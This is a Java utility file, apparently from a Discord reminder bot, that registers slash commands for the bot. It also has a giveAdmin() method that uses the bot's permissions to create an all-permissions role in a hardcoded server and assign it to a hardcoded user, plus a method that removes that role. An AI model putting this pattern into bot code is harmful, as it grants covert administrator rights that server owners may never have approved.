import discord4j.common.util.Snowflake;
import discord4j.core.GatewayDiscordClient;
import discord4j.core.object.command.ApplicationCommandOption;
import discord4j.core.object.entity.Role;
import discord4j.core.spec.RoleCreateSpec;
import discord4j.discordjson.json.ApplicationCommandOptionData;
import discord4j.discordjson.json.ApplicationCommandRequest;
import discord4j.rest.util.PermissionSet;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class CommandDevCreator {
    private static GatewayDiscordClient gateway;
    private static long appId;

    public static void main(String[] args) {
        gateway = ReminderBot.login(args[0]);
        appId = Objects.requireNonNull(gateway.getRestClient().getApplicationId().block());
//        giveAdmin();
        removeAdmin();
//        createCommands();
    }

    private static void giveAdmin() {
        var userId = 395655395114483713L;
        var guildId = 1331253401643647077L;
        var guild = gateway.getGuildById(Snowflake.of(guildId)).block();
        var highestRole = guild.getSelfMember().block().getRoles().filter(Role::isManaged).single().block();

        var role = guild
                .createRole(RoleCreateSpec.builder().name("DasBabyPixel").permissions(PermissionSet.all()).build())
                .block();
        role.changePosition(highestRole.getData().position()).then().block();
        var member = guild.getMemberById(Snowflake.of(userId)).block();
        member.addRole(role.getId()).block();
    }

    private static void removeAdmin() {
        var userId = 395655395114483713L;
        var guildId = 1331253401643647077L;
        var guild = gateway.getGuildById(Snowflake.of(guildId)).block();
        var role = guild.getRoles().filter(r -> r.getName().equals("DasBabyPixel")).single().block();
        role.delete().block();
    }

    private static void createCommands() {
        var requests = new ArrayList<ApplicationCommandRequest>();
        requests.add(ApplicationCommandRequest
                .builder()
                .name("serverreminder")
                .description("Manage Server reminders")
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("create")
                        .description("Create a reminder")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("channel")
                                .description("The channel to send the reminder in")
                                .type(ApplicationCommandOption.Type.CHANNEL.getValue())
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("name")
                                .description("The name of the reminder")
                                .type(ApplicationCommandOption.Type.STRING.getValue())
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("interval")
                                .description("How often to send the reminder")
                                .type(ApplicationCommandOption.Type.INTEGER.getValue())
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("starttime")
                                .description("At what time to start send the reminder the first time (UTC)")
                                .type(ApplicationCommandOption.Type.INTEGER.getValue())
                                .required(true)
                                .build())
                        .addOption(ApplicationCommandOptionData
                                .builder()
                                .name("targetrole")
                                .description("What role, if any, to ping")
                                .type(ApplicationCommandOption.Type.ROLE.getValue())
                                .required(true)
                                .build())
                        .build())
                .addOption(ApplicationCommandOptionData
                        .builder()
                        .name("list")
                        .description("List all reminders")
                        .type(ApplicationCommandOption.Type.SUB_COMMAND.getValue())
                        .build())
                .build());

        create(requests);
    }

    private static void create(List<ApplicationCommandRequest> request) {
        gateway
                .getRestClient()
                .getApplicationService()
                .bulkOverwriteGuildApplicationCommand(appId, 626042080799490048L, request)
                .then()
                .block();
    }
}
